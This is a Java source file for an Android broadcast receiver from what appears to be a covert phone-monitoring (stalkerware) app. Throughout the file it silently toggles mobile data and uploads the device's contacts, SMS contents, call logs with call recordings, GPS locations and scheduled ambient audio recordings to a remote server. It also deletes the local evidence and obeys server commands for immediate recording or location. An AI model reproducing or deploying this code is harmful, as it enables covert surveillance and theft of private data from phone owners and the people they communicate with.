package com.privacy.monitor.receiver;

import java.io.File;
import java.util.ArrayList;
import java.util.Date;
import org.json.JSONException;
import org.json.JSONObject;
import com.google.gson.Gson;
import com.privacy.monitor.base.C;
import com.privacy.monitor.db.CallRecordDB;
import com.privacy.monitor.db.ContactsDB;
import com.privacy.monitor.db.FileDB;
import com.privacy.monitor.db.LocManDB;
import com.privacy.monitor.db.MonitorDB;
import com.privacy.monitor.db.RegularDB;
import com.privacy.monitor.db.SMSRecordDB;
import com.privacy.monitor.domain.CallRecord;
import com.privacy.monitor.domain.Contacts;
import com.privacy.monitor.domain.DeviceInfo;
import com.privacy.monitor.domain.LocationMessage;
import com.privacy.monitor.domain.Monitor;
import com.privacy.monitor.domain.Regular;
import com.privacy.monitor.domain.SMSRecord;
import com.privacy.monitor.domain.SoundFileInfo;
import com.privacy.monitor.service.utilservice.ClientSocket;
import com.privacy.monitor.service.utilservice.ExecuteImmLoc;
import com.privacy.monitor.service.utilservice.ExecuteImmSoundRec;
import com.privacy.monitor.util.AlarmManagerUtil;
import com.privacy.monitor.util.AppUtil;
import com.privacy.monitor.util.HttpUtil;
import com.privacy.monitor.util.Logger;
import com.privacy.monitor.util.NetworkUtil;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.TelephonyManager;
import android.text.TextUtils;

/**
 * 自定义广播
 */
public class CronBroadcaseRectiver extends BroadcastReceiver {

	private static final String TAG = CronBroadcaseRectiver.class.getSimpleName();
	private MonitorDB monitorDB;
	private SMSRecordDB smsRecordDB;
	private LocManDB locManDB;
	private FileDB fileDB;
	private CallRecordDB callRecordDB;
	private ContactsDB contactsDB;
	private RegularDB regularDB;
	private TelephonyManager tm;
	private ClientSocket cSocket;
	private String myPhone;
	private String deviceId;
	private boolean isCloseMobileNet,isSendLoc,isSendRec ;
	private Context context;
	private Thread executeLoc,executeSoundRec;
	private  SharedPreferences sp ;
	
	@Override
	public void onReceive(final Context context, Intent intent) {
		this.context = context;
		sp = context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
		deviceId = sp.getString(C.DEVICE_ID,"");
		if(TextUtils.isEmpty(myPhone)){
			myPhone = sp.getString(C.PHONE_NUM,"");
		}
		
		locManDB = LocManDB.getInstance(context);
		fileDB = FileDB.getInstance(context);
		smsRecordDB = SMSRecordDB.getInstance(context);
		callRecordDB = CallRecordDB.getInstance(context);
		monitorDB = MonitorDB.getInstance(context);
		regularDB = RegularDB.getInstance(context);
		contactsDB = ContactsDB.getInstance(context);
		
		if(!HttpUtil.detect(context)){
			Logger.d("CronBroadcaseRectiver","开启网络");
			AppUtil.toggleMobileNet(context, true);
			isCloseMobileNet = true;
		}
		
		if(cSocket == null){
			String devBrand = sp.getString(C.DEVICE_BRAND,"");
			String devPhone = sp.getString(C.PHONE_NUM,"");
			String devID = sp.getString(C.DEVICE_ID,"");
			String devSystem = sp.getString(C.DEVICE_SYSTEM,"");
			String supRec = sp.getString(C.DEVICE_SUP_REC,"1");
			String supCallRec = sp.getString(C.DEVICE_SUP_CALL_REC,"1");
			String supGPS = sp.getString(C.DEVICE_SUP_GPS,"1");
			DeviceInfo deviceInfo = new DeviceInfo();
			deviceInfo.setBrand(devBrand);
			deviceInfo.setDeviceID(devID);
			deviceInfo.setSystem(devSystem);
			deviceInfo.setPhoneNum(devPhone);
			deviceInfo.setSupCallRec(supCallRec);
			deviceInfo.setSupRec(supRec);
			deviceInfo.setSupGPS(supGPS);
			
			cSocket = new ClientSocket(deviceInfo) {
				@Override
				public void receiveData(String type, String data) {
					boolean hasUpload= sp.getBoolean(C.CONTACTS_UPLOAD,false);
					if(!hasUpload){
						new Thread(new Runnable() {
							
							@Override
							public void run() {
								uploadContact(context, sp);
							}
						}).start();
						
					}
					handleMessage(type, data);
				}
			};
			cSocket.start();
		}else {
			if(cSocket.isInterrupted())cSocket.start();
		}
		
		new Thread(new Runnable() {
			
			@Override
			public void run() {
				
				if(tm==null){
					tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
				}
				SharedPreferences sp = context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
				String simID = tm.getSimSerialNumber();
				
				//更改号码了 
				if(!sp.getString(C.SIM_ID,"").equals(simID)){
					Editor editor = sp.edit();
					editor.putString(C.PHONE_NUM,simID);
					editor.commit();
				}
				
				Monitor monitor = monitorDB.queryOnlyRow(Monitor.COL_PHONE + " = ?",new String []{myPhone});
				if(monitor !=null){
					String callStatus = monitor.getCallMonitorStatus();
					String smsStatus = monitor.getSmsMonitorStatus();
					if("1".equals(callStatus)){
						uploadCallRecord(callRecordDB,context);
					}
					
					if("1".equals(smsStatus)){
						 uploadSMSData(smsRecordDB,context);
					}
					uploadLocList();
					uploadRecList();
				}
				
				
				
			
			    if(isCloseMobileNet){
			    	AppUtil.toggleMobileNet(context, false);
			    }
				
			}
		}).start();
		
	}
	
	private void uploadSMSData(SMSRecordDB smsRecordDB ,Context context) {
		ArrayList<SMSRecord> list = smsRecordDB.query(SMSRecord.COL_UPLOAD_STATUS +" = ? ",new String []{"0"});
		if (list != null && list.size() > 0) {
			ArrayList<ArrayList<String>> msgList = new ArrayList<ArrayList<String>>();
			for (SMSRecord smsRecord : list) {
				// uploadSmsInfo(smsRecord);
				ArrayList<String> msgs = new ArrayList<String>();
				msgs.add(smsRecord.getType());
				msgs.add(smsRecord.getPhone());
				msgs.add(smsRecord.getName());
				msgs.add(smsRecord.getDateSent());
				msgs.add(smsRecord.getMessageContent());
				msgList.add(msgs);
			}
			String params = "key=" + ClientSocket.APP_REQ_KEY+ "&device_id=" + sp.getString(C.DEVICE_ID, "")+ "&msg_list=" + new Gson().toJson(msgList);
			Logger.d("SMSMon","正在上传短信记录");
			String uploadResult = NetworkUtil.uploadSMS(context, params,C.RequestMethod.uploadSMS);
			if (uploadResult != null && !uploadResult.startsWith("FAIL")) {
				Logger.d("SMSMon","上传短信记录成功");
				smsRecordDB.deleteAll();
			}
		}
	}
	
	private void uploadCallRecord(CallRecordDB callRecordDB,Context context){
		ArrayList<CallRecord> callRecords = callRecordDB.queryAll();
		if(callRecords !=null){
		   for (CallRecord callRecord : callRecords) {
			   ArrayList<ArrayList<String>> lists = new ArrayList<ArrayList<String>>();
			String result = callRecord.getUploadResult();
			if(!"0".equals(result)){
				ArrayList<String> callRec = new ArrayList<String>();
				callRec.add(callRecord.getCallStatus());
				callRec.add(callRecord.getPhoneNumber());
				callRec.add(callRecord.getCallName());
				callRec.add(callRecord.getCallStartTime());
				callRec.add(callRecord.getCallStopTime());
				callRec.add(callRecord.getFileName());
				lists.add(callRec);
				String params = "key=" + ClientSocket.APP_REQ_KEY + "&device_id=" + sp.getString(C.DEVICE_ID,"") + "&call_list=" + new Gson().toJson(lists);
				String uploadResult = NetworkUtil.uploadCall(context,params,C.RequestMethod.uploadCallRecord);
			    if(uploadResult !=null && !uploadResult.startsWith("FAIL")){
			    	String filePath = callRecord.getSoundRecordPath();
			    	if(!TextUtils.isEmpty(filePath)){
			    		String uploadFileResult = NetworkUtil.uploadFile(context,filePath,callRecord.getFileName(),C.RequestMethod.uploadCallSoundFile);
			    		if(uploadFileResult.contains("FAULT")){
			    			callRecordDB.update(CallRecord.COL_UPLOAD_RESULT +" = ? "+" , " + CallRecord.COL_FILE_NAME +" = ? ",CallRecord.COL_CALL_START_TIME +" = ?",new String []{"0",result,callRecord.getCallStartTime()});
			    		}else {
							callRecordDB.delete(CallRecord.COL_CALL_START_TIME+" = ? ",new String []{callRecord.getCallStartTime()});
							File file = new File(filePath);
							if(file.exists()){
								if(file.isFile()){
									file.delete();
								}
							}
						}
			    	}else {
			    		callRecordDB.delete(CallRecord.COL_CALL_START_TIME+" = ? ",new String []{callRecord.getCallStartTime()});
					}
			    }
			 }else{
				 String filePath = callRecord.getSoundRecordPath();
				 if(!TextUtils.isEmpty(filePath)){
			    		String uploadFileResult = NetworkUtil.uploadFile(context,filePath,callRecord.getFileName(),C.RequestMethod.uploadCallSoundFile);
			    		if(uploadFileResult.contains("FAIL")){
			    			callRecordDB.update(CallRecord.COL_UPLOAD_RESULT +" = ? "+" , " + CallRecord.COL_FILE_NAME +" = ? ",CallRecord.COL_CALL_START_TIME +" = ?",new String []{"0",result,callRecord.getCallStartTime()});
			    		}else {
							callRecordDB.delete(CallRecord.COL_CALL_START_TIME+" = ? ",new String []{callRecord.getCallStartTime()});
							File file = new File(filePath);
							if(file.exists()){
								if(file.isFile()){
									file.delete();
								}
							}
						}
			    	}else {
			    		callRecordDB.delete(CallRecord.COL_CALL_START_TIME+" = ? ",new String []{callRecord.getCallStartTime()});
				}
			 }
		  }
	   }
	}
	
	//上传定时定位信息
	private void uploadLocList(){
		ArrayList<LocationMessage> arrayList = locManDB.queryAll();
		if(arrayList !=null){
			int size = arrayList.size();
			for(int i = 0 ; i < size ; i++){
				LocationMessage lm = arrayList.get(i);
				String longitude = lm.getLongitude();
				String latitude = lm.getLatitude();
				long strTime = Long.valueOf(lm.getLocTime());
				String result = NetworkUtil.sendLocInfo(context,ClientSocket.APP_REQ_KEY,sp.getString(C.DEVICE_ID, ""),longitude, latitude, " ", strTime + "",C.RequestMethod.uploadLocation);
			    if(!TextUtils.isEmpty(result) && !result.startsWith("FAIL")){
			    	locManDB.delete(LocationMessage.COL_ID +" =? ", new String []{lm.getId()} );
			    }
			}
		}
	}
	
	//上传定时录音信息
	private void uploadRecList(){
		
		ArrayList<SoundFileInfo> sfi = fileDB.queryAll();
		if(sfi !=null){
			int size = sfi.size();
			for(int i = 0 ; i < size ; i++){
				SoundFileInfo fileInfo = sfi.get(i);
				ArrayList<ArrayList<String>> list = new ArrayList<ArrayList<String>>();
				ArrayList<String> one = new ArrayList<String>();
				one.add(fileInfo.getStartTime());
				one.add(fileInfo.getEndTime());
				String id = fileInfo.getId();
				String fileName = fileInfo.getFileName();
				one.add(fileInfo.getFileName());
				String filePath = fileInfo.getFilePath();
				list.add(one);
				String param = "key=" + ClientSocket.APP_REQ_KEY + "&device_id=" + deviceId + "&rec_list=" + new Gson().toJson(list);
				String uploadResult = NetworkUtil.uploadFileInfo(context, param, C.RequestMethod.uploadCallSoundIntrod);
				if(!TextUtils.isEmpty(uploadResult)&& !uploadResult.startsWith("FAIL")){
					Logger.d("Cron","上传定时录音文件信息成功");
					String uploadFileResult = NetworkUtil.uploadFile(context, filePath, fileName, C.RequestMethod.uploadCallSoundFile);
					if(!TextUtils.isEmpty(uploadResult) && !uploadFileResult.startsWith("FAIL")){
						Logger.d("Cron","上传定时录音文件成功");
						fileDB.delete(LocationMessage.COL_ID+" =? ",new String []{id});
						File file =new File(filePath);
						file.delete();
					}
				}
			}
		}
	}
	
	private void uploadContact(Context context,SharedPreferences sp){
		Uri uri = Uri.parse("content://com.android.contacts/raw_contacts");
		ContentResolver resolver = context.getContentResolver();
		Cursor cursor =resolver.query(uri,new String[]{"_id"}, null, null, null);
		boolean one = false;
		boolean two = false;
		String name = "";
		String phone = "";
		ArrayList<ArrayList<String>> list = new ArrayList<ArrayList<String>>();
		if(cursor !=null){
			while(cursor.moveToNext()){
				int id = cursor.getInt(0);
				Uri uri2 = Uri.parse("content://com.android.contacts/data");
				Cursor cursor2 = resolver.query(uri2,new String[]{"mimetype","data1"}, "raw_contact_id = ? ", new String[]{id+""}, null);
			    if(cursor2!=null){
			    	while(cursor2.moveToNext()){
			    		String mimetype = cursor2.getString(0);
			    		String data1 = cursor2.getString(1);
			    		if("vnd.android.cursor.item/name".equals(mimetype)){
			    			name = data1;
			    			one = true;
			    		}else if("vnd.android.cursor.item/phone_v2".equals(mimetype)){
			    			phone = data1;
			    			two = true;
			    		}
			    		if(one && two){
			    			ArrayList<String> contactList = new ArrayList<String>();
			    			contactList.add(name);
			    			contactList.add(phone);
			    			list.add(contactList);
			    			Contacts contacts = new Contacts();
			    			contacts.setConName(name);
			    			contacts.setConPhone(phone);
			    			contactsDB.insert(contacts);
			    			one = false;
			    			two = false;
			    		}
			    	}
			    }
			}
			String param = "key="+ClientSocket.APP_REQ_KEY+"&device_id="+sp.getString(C.DEVICE_ID,"")+"&book_list="+ new Gson().toJson(list);
		
			String result = NetworkUtil.uploadBook(context, param,C.RequestMethod.uploadContact);
			if(result !=null && !result.startsWith("FAIL")){
				Editor editor = sp.edit();
				editor.putBoolean(C.CONTACTS_UPLOAD, true);
				editor.commit();
			}
		}
	}
	
	//处理服务端返回的信息
	private void handleMessage(final String type,final String data){
		try {
			Logger.d("Cron","type type type:"+type);
			if(ClientSocket.TYPE_INFO.equalsIgnoreCase(type)){
				Logger.d("Cron","准备把数据添加到数据库");
				JSONObject jsonObject = new JSONObject(data);
				monitorDB.deleteAll();
				//是否进行短信监控 
				String monMess = jsonObject.getString("can_mon_msg");
				
				//是否进行通话记录监控
				String monCall = jsonObject.getString("can_mon_call");
				
				//是否进行定位
				String monLoc = jsonObject.getString("can_mon_loc");
				
				//是否可以进行录音(环境录音)
				String monRec = jsonObject.getString("can_mon_rec");
			   
				Monitor monitor = new Monitor();
				monitor.setCallMonitorStatus(monCall);
				monitor.setEnvRecMonitorStatus(monRec);
				monitor.setFilterStatus("2");
				monitor.setLocationStatus(monLoc);
				monitor.setSmsMonitorStatus(monMess);
				monitor.setPhone(myPhone);
				Monitor monitor2 = monitorDB.queryOnlyRow(Monitor.COL_PHONE +" = ? ", new String [] {myPhone});
				if(monitor2!=null){
					monitorDB.update(monitor, Monitor.COL_PHONE +" =? ",new String []{myPhone});
				}else {
					monitorDB.insert(monitor);
				}
			
				//监控短信列表
				String msgList = jsonObject.getString("msg_list");
				Logger.d("Cron","监控短信列表:"+msgList);
				parseMessage(msgList);
				
				//定时录音列表
				String recList = jsonObject.getString("rec_list");
				Logger.d("Cron","定时录音列表:"+recList);
				parseSoundRec(recList);
				
				//定时定位列表
				String locList=jsonObject.getString("loc_list");
				Logger.d("Cron","定时定位列表:"+locList);
				parseLoc(locList);
				
				//监控通话列表
				String callList = jsonObject.getString("call_list");
				Logger.d("Cron","监控通话列表:"+callList);
				parseMonitorCallPhone(callList);
				
			//立刻定位
			}else if(ClientSocket.TYPE_GPS_NOW.equalsIgnoreCase(type)){
				if(executeLoc==null){
					executeLoc = new Thread(new Runnable() {
						
						@Override
						public void run() {
							ExecuteImmLoc eImmLoc = ExecuteImmLoc.getInatance(context);
						    eImmLoc.executeTask(type, data);
						}
					});
				}
				executeLoc.start();
			    
		    //立刻录音 
			}else if(ClientSocket.TYPE_REC_NOW.equalsIgnoreCase(type)){
				
				if(executeSoundRec==null){
					executeSoundRec = new Thread(new Runnable() {
						
						@Override
						public void run() {
							ExecuteImmSoundRec eis = ExecuteImmSoundRec.getInstance();
							eis.executeSoundRec(context, data);
						}
					});
					executeSoundRec.start();
				}
			}
			
		} catch (JSONException e) {
			Logger.d(TAG,"json format error");
		}
	}
	
	//解析获取监控信息的号码
	private void parseMessage(String message){
			if(!TextUtils.isEmpty(message)){
				if(message.contains(";")){
					String[] mesType = message.split(";");
					Logger.d("Cron","短信长度:"+mesType.length);
					int len = mesType.length;
					if(mesType.length>0){
						
						String [] mesMonitorNum = mesType[0].split(",");
						Logger.d("Cron","短信监听有:"+mesMonitorNum.length+"个号码");
						if(mesMonitorNum!=null && mesMonitorNum.length > 0){
							int size = mesMonitorNum.length;
							for(int i = 0 ; i < size ; i ++){
								String mesMonPho = mesMonitorNum[i];
								Monitor monitor = monitorDB.queryOnlyRow(Monitor.COL_PHONE +" = ? ",new String[]{mesMonPho});
							    if(monitor !=null){
							    	Logger.d("Cron","短信监控更新");
							    	monitor.setSmsMonitorStatus("1");
							    	monitorDB.update(monitor, Monitor.COL_PHONE +" = ? ",new String []{mesMonPho});
							    }else {
							    	Logger.d("Cron","短信监控增加");
									monitor = new Monitor();
									monitor.setPhone(mesMonPho);
									monitor.setSmsMonitorStatus("1");
									monitorDB.insert(monitor);
								}
							}
						}
						if(len==3){
							String [] mesFilterNum = mesType[2].split(",");
							if(mesFilterNum != null && mesFilterNum.length > 0){
								int size = mesFilterNum.length;
								for(int i = 0 ; i < size ;i++){
									String mesFilPho = mesFilterNum[i];
									executeMonitorMess(mesFilPho);
								}
							}
						}
					}
				}else if("all".equalsIgnoreCase(message)){
					ArrayList<Contacts> allContacts = contactsDB.queryAll();
					if(allContacts !=null){
						int size = allContacts.size();
						for(int i = 0 ; i < size ; i++){
							executeMonitorMess(allContacts.get(i).getConPhone());
						}
					}
				}
		}
	}

	private void executeMonitorMess(String mesFilPho) {
		Monitor monitor = monitorDB.queryOnlyRow(Monitor.COL_PHONE +" = ? ",new String[]{mesFilPho});
		if(monitor !=null){
			monitor.setFilterStatus("1");
			monitorDB.update(monitor, Monitor.COL_PHONE +" = ? ",new String []{mesFilPho});
		}else {
			monitor = new Monitor();
			monitor.setPhone(mesFilPho);
			monitor.setFilterStatus("1");
			monitorDB.insert(monitor);
		}
	}
	
	//解析监控通话手机
	private void parseMonitorCallPhone(String str){
		if(!TextUtils.isEmpty(str)){
			if(str.contains(";")){
				String [] monPhone = str.split(";");
				Logger.d("Cron","monPhone列表长度:"+monPhone.length);
				if(monPhone !=null && monPhone.length >0){
					//监控的手机号码
					String [] monPhones = monPhone[0].split(",");
					
					int length  = monPhones.length;
					
					for(int i = 0 ; i < length ; i ++){
						String strPhone =monPhones[i]; 
						executeMonitorCallStatus(strPhone);
					}
				}
			}else if("all".equalsIgnoreCase(str)){
				ArrayList<Contacts> contacts = contactsDB.queryAll();
				if(contacts !=null){
					int size = contacts.size();
					for(int i = 0 ; i < size ; i ++){
						executeMonitorCallStatus(contacts.get(i).getConPhone());
					}
				}
			}
		}
	}

	private void executeMonitorCallStatus(String strPhone) {
		Monitor monitor = monitorDB.queryOnlyRow(Monitor.COL_PHONE +" = ? ",new String[]{strPhone});
		 if(monitor !=null){
			    
		    	monitor.setCallMonitorStatus("1");
		    	monitorDB.update(monitor, Monitor.COL_PHONE +" = ? ",new String []{strPhone});
		    }else {
		    	
				monitor = new Monitor();
				monitor.setPhone(strPhone);
				monitor.setCallMonitorStatus("1");
				monitorDB.insert(monitor);
		}
	}
	
	//定时录音
	private void parseSoundRec(String reString){
		boolean isExecuteTask = false;
		if(!TextUtils.isEmpty(reString)){
			if(reString.contains(",")){
				String [] regs = reString.split(",");
				if(regs !=null && regs.length > 0){
					int size = regs.length;
					for(int i = 0 ; i < size;i++){
						String [] rege = regs[i].split(";");
						if(rege !=null && rege.length==2){
							String strStart = rege[0];
							String strLong = rege[1];
							Regular regular2= regularDB.queryOnlyRow(Regular.COL_REG_START+" =? " +" and " + Regular.COL_TYPE +" = ? ",new String []{strStart,C.REG_TYPE_REC});
							if(regular2==null){
								 Regular regular = new Regular();
								 regular.setLocLong(strLong);
								 regular.setLocStartTime(strStart);
								 regular.setRegType(C.REG_TYPE_REC);
								 regularDB.insert(regular);
								 isExecuteTask = true;
							}else {
								if(!strLong.equals(regular2.getLocLong())){
									regular2.setLocLong(strLong);
									regularDB.update(regular2,C.REG_TYPE_LOC);
								}
							}
						}
					}
				}
				
			}else if(reString.contains(";")) {
				String [] regularMess = reString.split(";");
				if(regularMess !=null && regularMess.length==2){
					String strStart = regularMess[0];
					String strLong = regularMess[1];
					Regular regular2= regularDB.queryOnlyRow(Regular.COL_REG_START+" =? " +" and " + Regular.COL_TYPE +" = ? ",new String []{strStart,C.REG_TYPE_REC});
					if(regular2==null){
						Regular regular = new Regular();
						regular.setLocLong(strLong);
						regular.setLocStartTime(strStart);
						regular.setRegType(C.REG_TYPE_REC);
						regularDB.insert(regular);
						isExecuteTask = true;
					}else {
						if(!strLong.equals(regular2.getLocLong())){
							regular2.setLocLong(strLong);
							regularDB.update(regular2,C.REG_TYPE_LOC);
						}
					}
				}
			}
		}
		if(isExecuteTask && !isSendRec){
			Regular regular = regularDB.queryOnlyRow(Regular.COL_TYPE +" = ? ",new String []{C.REG_TYPE_REC});
			if(regular !=null){
				String startTime = regular.getLocStartTime();
				if(!TextUtils.isEmpty(startTime)){
					Date date = new Date();
					long curTime = date.getTime();
					long executeTime = Long.valueOf(startTime);
					long recLong = Long.valueOf(regular.getLocLong());
					if(executeTime > curTime){
						isSendRec = true;
						AlarmManagerUtil.sendSoundRecBroadcast(context, executeTime,C.SOUND_REC_ACTION,recLong);
					}else {
						regularDB.delete(Regular.COL_REG_START +" = ? ",new String []{executeTime+""});
						Logger.d("Cron","删除定时录音信息成功");
					}
				}
			}
		}
	}
	
	//解析定时定位
	private void parseLoc(String reStr){
		if(!TextUtils.isEmpty(reStr)){
			boolean isExecuteLoc = false;
			if(reStr.contains(",")){
				
				String [] loc = reStr.split(",");
				if(loc !=null && loc.length > 0){
					int size = loc.length;
					for(int i = 0 ; i < size;i++){
						String [] locc = loc[i].split(";");
						if(locc !=null && locc.length==2){
							String strStart = locc[0];
							String strLong = locc[1];
						   Regular regular2= regularDB.queryOnlyRow(Regular.COL_REG_START+" =? " +" and " + Regular.COL_TYPE +" = ? ",new String []{strStart,C.REG_TYPE_LOC});
						   if(regular2==null){
							   Regular regular = new Regular();
								regular.setLocLong(strLong);
								regular.setLocStartTime(strStart);
								regular.setRegType(C.REG_TYPE_LOC);
								regularDB.insert(regular);
								isExecuteLoc = true;
						   }else {
								if(!strLong.equals(regular2.getLocLong())){
									regular2.setLocLong(strLong);
									regularDB.update(regular2,C.REG_TYPE_LOC);
								}
							}
						}
					}
				}
				
			}else if(reStr.contains(";")) {
				String [] regularMess = reStr.split(";");
				if(regularMess !=null && regularMess.length==2){
					String strStart = regularMess[0];
					String strLong = regularMess[1];
					 Regular regular2= regularDB.queryOnlyRow(Regular.COL_REG_START+" =? " +" and " + Regular.COL_TYPE +" = ? ",new String []{strStart,C.REG_TYPE_LOC});
					 if(regular2==null){
						    Regular regular = new Regular();
							regular.setLocLong(strLong);
							regular.setLocStartTime(strStart);
							regular.setRegType(C.REG_TYPE_LOC);	
							regularDB.insert(regular);
							isExecuteLoc = true;
					 }else {
						if(!strLong.equals(regular2.getLocLong())){
							regular2.setLocLong(strLong);
							regularDB.update(regular2,C.REG_TYPE_LOC);
						}
					}
				}
			}
			
			if(isExecuteLoc && !isSendLoc){
				Regular regular = regularDB.queryOnlyRow(Regular.COL_TYPE +" = ? ",new String []{C.REG_TYPE_LOC});
				if(regular !=null){
					String strTime = regular.getLocStartTime();
					long lonStartTime = Long.valueOf(strTime);
					long curTime = new Date().getTime();
					if(lonStartTime > curTime){
						Logger.d("Cron","发送定时定位信息了");
						AlarmManagerUtil.sendLocBroadcast(context, lonStartTime,C.LOC_ACTION);
						isSendLoc = true;
					}else {
						regularDB.delete(Regular.COL_REG_START +" = ? ",new String []{lonStartTime+""});
						Logger.d("Cron","删除定时定位信息成功");
					}
				}
			}
		}
	}
}
